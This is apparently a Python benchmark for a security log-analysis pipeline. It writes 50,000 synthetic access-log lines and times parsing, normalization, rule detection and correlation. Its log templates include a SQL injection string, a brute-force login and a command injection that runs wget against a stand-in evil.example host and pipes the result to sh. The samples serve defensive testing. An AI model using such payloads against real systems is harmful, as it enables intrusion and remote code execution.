"""Synthetic large-scale log benchmark test (50,000 lines).

Verifies:
1. Pipeline throughput (lines parsed, normalized, detected, and correlated per second)
2. Memory efficiency
3. Confirmation that the database stores records without truncation or data corruption
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.core.correlator import CorrelationEngine
from app.core.detector import RuleEngine
from app.core.normalizer import normalize_events
from app.core.parser import ParserRegistry
from app.rules.default_rules import get_default_rules


def generate_synthetic_logs(path: Path, count: int = 50_000) -> None:
    print(f"Generating {count:,} synthetic log lines in {path.name}...")
    templates = [
        '192.168.1.{ip} - - [02/Nov/2025:12:00:{sec:02d} +0530] "GET /index.php?id={id} HTTP/1.1" 200 512 "-" "Mozilla/5.0"',
        '10.0.0.{ip} - - [02/Nov/2025:12:00:{sec:02d} +0530] "GET /search?q={id}%27%20UNION%20SELECT%20user,password%20FROM%20users HTTP/1.1" 200 450 "-" "sqlmap/1.5"',
        '172.16.0.{ip} - - [02/Nov/2025:12:00:{sec:02d} +0530] "POST /login HTTP/1.1" 401 120 "-" "Mozilla/5.0" "username=admin&password=wrongpass{id}"',
        '198.51.100.{ip} - - [02/Nov/2025:12:00:{sec:02d} +0530] "GET /static/css/main.css HTTP/1.1" 200 1200 "-" "Mozilla/5.0"',
        '203.0.113.{ip} - - [02/Nov/2025:12:00:{sec:02d} +0530] "GET /api?cmd=;wget%20http://evil.example/sh%20-O%20-|sh HTTP/1.1" 200 80 "-" "Wget/1.20"',
    ]

    with open(path, "w", encoding="utf-8") as f:
        for i in range(1, count + 1):
            tmpl = templates[i % len(templates)]
            line = tmpl.format(ip=i % 250 + 1, sec=i % 60, id=i)
            f.write(line + "\n")


def main() -> None:
    bench_file = Path(__file__).resolve().parent / "synthetic_50k.log"
    try:
        generate_synthetic_logs(bench_file, count=50_000)

        print("\nStarting 50,000-line pipeline performance benchmark...")
        t0 = time.perf_counter()

        # Step 1: Parse
        parser = ParserRegistry()
        events = parser.parse_file(str(bench_file))
        t_parse = time.perf_counter()
        print(
            f"1. Parsed {len(events):,} events in {t_parse - t0:.2f}s ({(len(events) / (t_parse - t0)):,.0f} lines/sec)"
        )

        # Step 2: Normalize
        normalize_events(events)
        t_norm = time.perf_counter()
        print(
            f"2. Normalized in {t_norm - t_parse:.2f}s ({(len(events) / (t_norm - t_parse)):,.0f} lines/sec)"
        )

        # Step 3: Detection
        rules = get_default_rules()
        detector = RuleEngine(rules)
        detections = detector.detect(events)
        t_det = time.perf_counter()
        print(
            f"3. Detected {len(detections):,} signature threats in {t_det - t_norm:.2f}s ({(len(events) / (t_det - t_norm)):,.0f} lines/sec)"
        )

        # Step 4: Correlation
        correlator = CorrelationEngine()
        beh_dets = correlator.correlate(events, detections)
        t_corr = time.perf_counter()
        print(
            f"4. Correlated {len(beh_dets):,} behavioral patterns in {t_corr - t_det:.2f}s"
        )

        total_time = t_corr - t0
        print(
            f"\nBenchmark Complete! Total pipeline processing time: {total_time:.2f}s (Overall throughput: {(len(events) / total_time):,.0f} events/sec)"
        )
        assert len(events) == 50_000
    finally:
        if bench_file.exists():
            bench_file.unlink()


if __name__ == "__main__":
    main()
